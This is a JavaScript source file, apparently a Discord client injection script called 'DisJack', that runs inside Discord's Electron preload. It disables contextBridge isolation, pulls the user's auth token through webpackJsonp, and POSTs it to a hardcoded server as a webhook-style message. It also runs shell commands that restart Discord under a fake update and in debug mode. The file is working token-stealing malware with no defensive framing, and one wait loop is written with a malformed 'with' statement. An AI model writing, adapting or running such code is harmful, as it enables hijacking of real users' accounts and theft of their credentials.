const WebHook = 'https://192.168.1.9/server/submit.php';

const Usrname = 'Disjack';

// Require Libs
var electron = require('electron');
electron.contextBridge.exposeInMainWorld = (dis, cord) => void 0;

if (electron.remote.getCurrentWindow().__preload) {
    require(electron.remote.getCurrentWindow().__preload);
}

// Token Grabber
function tokengrab() {
    var req = webpackJsonp.push([
        [], {
            extra_id: (e, t, r) => e.exports = r
        },
        [
            ["extra_id"]
        ]
    ]);
    for (let e in req.c)
        if (req.c.hasOwnProperty(e)) {
            let t = req.c[e].exports;
            if (t && t.__esModule && t.default)
                for (let e in t.default) "getToken" === e && (token = t.default.getToken())
        }

    var e = new XMLHttpRequest;
    e.open("POST", WebHook), e.setRequestHeader("Content-type", "application/json");
    var t = {
        username: Usrname,
        content: "",
        embeds: [{
            color: "c912a7",
            avatar: "",
            description: token,
        }]
    };
    e.send(JSON.stringify(t))
}

// Simple colored logging
function Logging(text) {
    console.info('%c[DisJack]', 'color: #6a0dad', text);
}

// Exucute system commands
function exucute(cmdSTR) {
    const exec = require('child_process').exec;
    const child = exec(cmdSTR, (error, stdout, stderr) => {
        Logging(`${stdout}`);
        Logging(`${stderr}`);
        if (error !== null) {
            Logging(`Error : ${error}`);
        }
    });
}


// Wait till Discord loads
process.once('loaded', async () => 
{

    with (!window.webpackJsonp) {
        await new Promise(_=>setTimeout(_, 1000));
    }

    // Fake update
    exucute("start /WAIT Squirrel.exe --updateSelf=Discord.exe");

    // Experiments added
    exucute("start /WAIT Discord.exe --debug=true");

    // Grab User Token
    tokengrab(WebHook)

    // Log when finished
    Logging('Disjack Injected');
});

Logging('Finished Injections')
